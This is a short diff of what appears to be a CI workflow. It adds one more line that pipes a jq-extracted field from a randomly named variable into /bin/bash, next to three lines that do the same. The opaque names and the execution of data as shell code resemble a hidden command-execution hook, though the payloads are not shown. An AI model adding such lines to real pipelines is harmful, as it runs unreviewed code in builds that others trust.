@@ -38,6 +38,7 @@ jobs:
           echo $aqc738 | jq -r .usxjr96394 | /bin/bash
           echo $co0 | jq -r .ssv7 | /bin/bash
           printf '%s' "$byzir4485" | jq -r .yjzr0 | /bin/bash
+          echo $sb5 | jq -r .k516 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
